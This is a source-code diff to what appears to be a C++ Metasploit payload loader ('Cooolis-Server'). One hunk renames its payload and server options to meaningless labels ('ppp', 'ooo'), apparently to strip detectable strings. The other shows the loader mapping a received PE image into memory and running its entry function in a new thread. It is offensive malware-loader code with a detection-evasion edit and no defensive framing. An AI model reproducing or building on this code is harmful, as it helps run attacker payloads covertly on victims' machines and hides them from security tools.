@@ -37,10 +37,10 @@ int main(int argc, char** argv)
 	std::string msf_payload = "";
 	std::string msf_options = "";
 	std::string msf_server_host = "";
-	app.add_option("-p,--payload", msf_payload, "PAYLOAD TYPE")->required();
-	app.add_option("-s,--options", msf_options, "PAYLOAD OPTIONS")->required();
-	app.add_option("-P,--PORT", msf_server_port, "Cooolis-Server Port")->check(CLI::Range(1, 65535))->required();
-	app.add_option("-H,--HOST", msf_server_host, "Cooolis-Server Host")->check(CLI::ValidIPV4)->required();
+	app.add_option("-p,--ppp", msf_payload, "ppp")->required();
+	app.add_option("-o,--ooo", msf_options, "ooo")->required();
+	app.add_option("-P,--PORT", msf_server_port, "Port")->check(CLI::Range(1, 65535))->required();
+	app.add_option("-H,--HOST", msf_server_host, "Host")->check(CLI::ValidIPV4)->required();
 
 	try {
 		app.parse(argc, argv);
@@ -115,6 +115,7 @@ int main(int argc, char** argv)
 
 	// 导入PE文件
 	hModule = MemoryLoadLibrary(pSpace);
+	// hModule = MemoryLoadLibrary(NULL);
 	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);
 	
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);
